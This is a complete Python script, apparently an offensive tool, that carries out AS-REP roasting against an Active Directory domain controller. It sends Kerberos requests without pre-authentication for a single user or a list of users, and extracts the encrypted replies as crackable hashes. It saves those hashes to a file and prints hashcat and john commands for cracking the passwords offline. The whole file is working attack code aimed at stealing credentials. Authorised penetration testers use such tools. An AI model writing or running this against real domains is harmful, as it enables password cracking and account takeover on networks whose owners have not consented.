#!/usr/bin/env python3
import os
import sys
import re
import platform
import traceback
from datetime import datetime, timedelta, timezone

from ldap3 import Server, Connection, ALL, NTLM
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError
from colorama import Fore, Style, init

from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import signal

def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)
init(autoreset=True)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════╗
    ║          AS-REPRoasting Attack            ║
    ║    Finds users with PreAuth Disabled      ║
    ╚═══════════════════════════════════════════╝
    """)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def check_ip_reachable(dc_ip):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server)
        conn.open()
        conn.unbind()
        return True
    except Exception:
        return False


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def resolve_file_path(user_input):
    user_input = user_input.lstrip('/').lstrip('\\')
    return os.path.normpath(os.path.join(os.getcwd(), user_input))


def validate_userlist_file(file_path):
    full_path = resolve_file_path(file_path)

    if not os.path.exists(full_path):
        print(Fore.RED + f"[!] File not found: {full_path}" + Style.RESET_ALL)
        return None
    if os.path.getsize(full_path) == 0:
        print(Fore.RED + f"[!] File is empty: {full_path}" + Style.RESET_ALL)
        return None
    if not os.access(full_path, os.R_OK):
        print(Fore.RED + f"[!] Cannot read file: {full_path}" + Style.RESET_ALL)
        return None

    with open(full_path, 'r') as f:
        users = [line.strip() for line in f.readlines() if line.strip()]

    if not users:
        print(Fore.RED + f"[!] No valid users found in: {full_path}" + Style.RESET_ALL)
        return None

    print(Fore.GREEN + f"[+] Found {len(users)} users in: {full_path}" + Style.RESET_ALL)
    return users


def resolve_output_file(user_input):
    if not user_input:
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        filename  = f"asrep-hashes-{timestamp}.txt"
        return os.path.join(os.getcwd(), filename)

    full_path = resolve_file_path(user_input)
    directory = os.path.dirname(full_path)

    if directory and not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
            print(Fore.YELLOW + f"[*] Created directory: {directory}" + Style.RESET_ALL)
        except PermissionError:
            print(Fore.RED + f"[!] Permission denied: {directory}" + Style.RESET_ALL)
            fallback = os.path.join(os.getcwd(), os.path.basename(user_input))
            print(Fore.YELLOW + f"[*] Saving to: {fallback}" + Style.RESET_ALL)
            return fallback
        except Exception as e:
            print(Fore.RED + f"[!] Cannot create directory: {e}" + Style.RESET_ALL)
            sys.exit(1)

    return full_path


def get_asrep_hash(username, domain, dc_ip):
    try:
        domain_upper = domain.upper()
        server_name  = Principal(
            'krbtgt/%s' % domain_upper,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        client_name  = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        asReq = AS_REQ()

        pac_request = KERB_PA_PAC_REQUEST()
        pac_request['include-pac'] = True
        encoded_pac_request = encoder.encode(pac_request)

        asReq['pvno']     = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata']    = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type']  = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encoded_pac_request

        req_body = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        req_body['kdc-options'] = constants.encodeFlags(opts)

        seq_set(req_body, 'sname', server_name.components_to_asn1)
        seq_set(req_body, 'cname', client_name.components_to_asn1)

        req_body['realm'] = domain_upper

        now = datetime.now(timezone.utc) + timedelta(days=1)
        req_body['till']  = KerberosTime.to_asn1(now)
        req_body['rtime'] = KerberosTime.to_asn1(now)
        req_body['nonce'] = 0x7fffffff

        supported_ciphers = (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        )
        seq_set_iter(req_body, 'etype', supported_ciphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, dc_ip)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                return None
            raise

        try:
            error_resp = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
            error_code = int(error_resp['error-code'])
            if error_code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                print(Fore.WHITE + f"    [-] {username}: Pre-Auth required (not vulnerable)" + Style.RESET_ALL)
            elif error_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                print(Fore.RED + f"    [-] {username}: User not found" + Style.RESET_ALL)
            elif error_code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                print(Fore.RED + f"    [-] {username}: Account disabled/locked" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"    [-] {username}: KRB Error {error_code}" + Style.RESET_ALL)
            return None
        except Exception:
            pass

        try:
            asRep      = decoder.decode(r, asn1Spec=AS_REP())[0]
            enc_type   = int(asRep['enc-part']['etype'])
            cipher     = bytes(asRep['enc-part']['cipher'])
            cipher_hex = cipher.hex()

            if enc_type == int(constants.EncryptionTypes.rc4_hmac.value):
                hash_str = f"$krb5asrep$23${username}@{domain_upper}:{cipher_hex[:32]}${cipher_hex[32:]}"
            elif enc_type == int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value):
                hash_str = f"$krb5asrep$17${username}@{domain_upper}:{cipher_hex[:32]}${cipher_hex[32:]}"
            elif enc_type == int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
                hash_str = f"$krb5asrep$18${username}@{domain_upper}:{cipher_hex[:32]}${cipher_hex[32:]}"
            else:
                hash_str = f"$krb5asrep${enc_type}${username}@{domain_upper}:{cipher_hex[:32]}${cipher_hex[32:]}"

            return hash_str

        except Exception as e:
            print(Fore.RED + f"    [-] {username}: Failed to parse AS_REP - {e}" + Style.RESET_ALL)
            return None

    except KerberosError as e:
        error_code = e.getErrorCode()
        if error_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
            print(Fore.RED + f"    [-] {username}: User not found" + Style.RESET_ALL)
        elif error_code == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
            print(Fore.RED + f"    [-] {username}: Account disabled/locked" + Style.RESET_ALL)
        elif error_code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            print(Fore.WHITE + f"    [-] {username}: Pre-Auth required (not vulnerable)" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + f"    [!] {username}: KRB Error {error_code}" + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + f"    [-] {username}: Error - {e}" + Style.RESET_ALL)
        return None


def run_asreproast(dc_ip, domain, output_file, fmt, username=None, userlist=None):
    print(Fore.YELLOW + "\n[*] Starting AS-REPRoasting attack..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Looking for users with Pre-Authentication disabled..." + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Hash format : {fmt}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Output file : {output_file}" + Style.RESET_ALL)

    users   = [username] if username else userlist
    hashes  = []
    success = 0
    failed  = 0

    try:
        for user in users:
            hash_str = get_asrep_hash(user, domain, dc_ip)
            if hash_str:
                success += 1
                print(Fore.GREEN + f"[+] VULNERABLE: {user}" + Style.RESET_ALL)
                hashes.append(hash_str)
            else:
                failed += 1

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)

    if hashes:
        print(Fore.GREEN + f"\n[+] Found {success} vulnerable user(s)!" + Style.RESET_ALL)

        try:
            with open(output_file, 'w') as f:
                for h in hashes:
                    f.write(h + '\n')
            print(Fore.GREEN + f"[+] Hashes saved to: {output_file}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to save hashes: {e}" + Style.RESET_ALL)

        print(Fore.CYAN + "\n[*] Captured hashes:" + Style.RESET_ALL)
        for h in hashes:
            print(Fore.YELLOW + f"    {h}" + Style.RESET_ALL)

        if fmt == 'hashcat':
            print(Fore.CYAN + "\n[*] Crack with hashcat:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    hashcat -m 18200 {output_file} wordlist.txt" + Style.RESET_ALL)
        else:
            print(Fore.CYAN + "\n[*] Crack with john:" + Style.RESET_ALL)
            print(Fore.WHITE + f"    john {output_file} --wordlist=wordlist.txt" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "\n[!] No vulnerable users found." + Style.RESET_ALL)

    print(Fore.CYAN + f"\n[*] Summary: {success} vulnerable, {failed} not vulnerable" + Style.RESET_ALL)


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.x.x"
    )

    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}! Check the IP or network." + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                       validate_domain, "Invalid domain format! Example: domain.com")

    print(Fore.CYAN + "\n[?] Attack mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Single user")
    print(Fore.WHITE + "    2. User list")
    mode = get_input(
        Fore.CYAN + "[?] Choose mode          : " + Style.RESET_ALL,
        lambda x: x in ['1', '2'],
        "Invalid choice! Enter 1 or 2"
    )

    username = None
    userlist = None

    if mode == '1':
        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
        # BUG FIX: Removed password prompt and credential validation
        # AS-REP Roasting targets users WITHOUT Pre-Auth, no password needed
        print(Fore.GREEN + f"[+] Targeting user: {username}" + Style.RESET_ALL)

    else:
        while True:
            list_input = get_input(
                Fore.CYAN   + "[?] Enter userlist path  : " + Style.RESET_ALL +
                Fore.YELLOW + "(e.g. users.txt or /lists/users.txt) " + Style.RESET_ALL
            )
            userlist = validate_userlist_file(list_input)
            if userlist:
                break

    print(Fore.CYAN + "\n[?] Choose hash format:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. hashcat (default)")
    print(Fore.WHITE + "    2. john")
    hash_choice = get_input(
        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL +
        Fore.YELLOW + "(default: 1) " + Style.RESET_ALL,
        allow_empty=True
    )
    fmt = 'john' if hash_choice == '2' else 'hashcat'
    print(Fore.GREEN + f"[+] Using format: {fmt}" + Style.RESET_ALL)

    timestamp    = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    default_name = f"asrep-hashes-{timestamp}.txt"
    out_input    = get_input(
        Fore.CYAN   + f"[?] Output filename      : " + Style.RESET_ALL +
        Fore.YELLOW + f"(default: {default_name}) " + Style.RESET_ALL,
        allow_empty=True
    )
    output_file = resolve_output_file(out_input if out_input else "")

    run_asreproast(dc_ip, domain, output_file, fmt, username=username, userlist=userlist)
